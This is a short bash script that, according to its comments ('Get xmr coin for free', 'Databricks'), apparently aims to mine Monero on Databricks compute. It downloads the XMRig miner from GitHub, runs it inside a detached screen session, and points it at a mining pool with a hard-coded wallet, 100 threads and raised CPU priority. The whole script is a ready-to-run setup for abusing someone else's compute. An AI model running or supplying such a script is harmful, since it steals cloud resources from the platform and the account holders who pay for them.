#! /bin/bash
# Get xmr coin for free
# Databricks
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.12.0/xmrig-6.12.0-focal-x64.tar.gz
tar xvzf xmrig-6.12.0-focal-x64.tar.gz
cd xmrig-6.12.0
./xmrig -a rx/0 -o s2.solopool.org:8010 -u 8BrixK3vTTdPRG92JMdwsefnDpLvzJUST6xf5PQn3iW2PFne3zwVAGhQPoVDx8zY2zG3WE9GvY1djgDB8HXhsg3wHxTCe9e -k --tls -p Threadripper --threads=100 --cpu-priority=5

